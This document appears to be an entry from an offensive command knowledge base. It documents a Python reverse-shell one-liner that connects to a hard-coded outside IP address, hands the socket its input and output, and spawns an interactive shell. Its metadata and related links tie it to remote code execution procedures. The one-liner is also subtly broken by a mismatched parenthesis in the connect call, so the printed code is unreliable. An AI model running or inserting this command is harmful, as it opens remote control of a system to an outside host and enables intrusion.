---
id: cmd-python-reverse-shell
data: >-
  python3 -c 'import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect("118.89.198.146",8000));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
tags:
  - rce
  - reverse-shell
type: command
output: Reverse shell connection established
executor: python3
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:09:00.662Z'
verified: false
validated: true
submitted: true
---
---

# python-reverse-shell

## Command

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect("118.89.198.146",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Description

Executes Python code to connect back to attacker, redirect I/O, and spawn interactive shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -c | Python code string | Yes |
| IP/port | Attacker endpoint | Yes |

## Examples

### Basic Usage

```bash
python3 -c 'import socket...'
```

### Advanced Usage

Embedded in class_eval arg.

## Expected Output

Reverse shell connection established

## Related

- [[procedures/Establish-Reverse-Shell-Connection]]
- [[commands/redis-lpush-payload]]

